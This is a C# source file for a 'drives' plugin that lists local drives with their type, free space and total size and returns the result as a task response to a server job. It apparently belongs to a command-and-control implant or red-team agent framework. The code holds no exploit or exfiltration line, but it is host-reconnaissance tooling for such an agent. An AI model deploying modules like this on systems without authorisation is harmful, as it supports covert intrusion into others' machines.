using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Text;

namespace Agent
{
    public class DriveObject
    {
        public string DriveName { get; set; }
        public string DriveType { get; set; }
        public long FreeSpace { get; set; }
        public long TotalSpace { get; set; }
    }
    public class Plugin : IPlugin
    {
        public string Name => "drives";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private IAgentConfig config { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            try
            {
                string output = String.Empty;
                if (this.config.prettyOutput)
                {
                    output = getJsonOutput(DriveInfo.GetDrives());
                }
                else
                {
                    output = getBasicOutput(DriveInfo.GetDrives());
                }
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = output,
                    completed = true
                });
            }
            catch (Exception e)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true
                });
            }
        }

        private string getBasicOutput(DriveInfo[] drives)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Name\t\t\t\tType\t\t\t\tFree Space\t\t\t\t TotalSize");
            foreach (var drive in drives)
            {
                sb.AppendLine(drive.Name + "\t\t\t\t" + drive.DriveType + "\t\t\t\t" + (drive.TotalFreeSpace / 1000000000).ToString() + "\t\t\t\t" + (drive.TotalSize / 1000000000).ToString());
            }
            return sb.ToString();
        }

        private string getJsonOutput(DriveInfo[] drives)
        {
            List<DriveObject> driveOutput = new List<DriveObject>();

            foreach (var drive in drives)
            {
                try
                {
                    driveOutput.Add(new DriveObject()
                    {
                        DriveName = drive.Name,
                        DriveType = drive.DriveType.ToString(),
                        FreeSpace = drive.TotalFreeSpace / 1000000000,
                        TotalSpace = drive.TotalSize / 1000000000
                    });
                }
                catch
                {

                }
            }

            return JsonSerializer.Serialize(driveOutput);
        }
    }
}
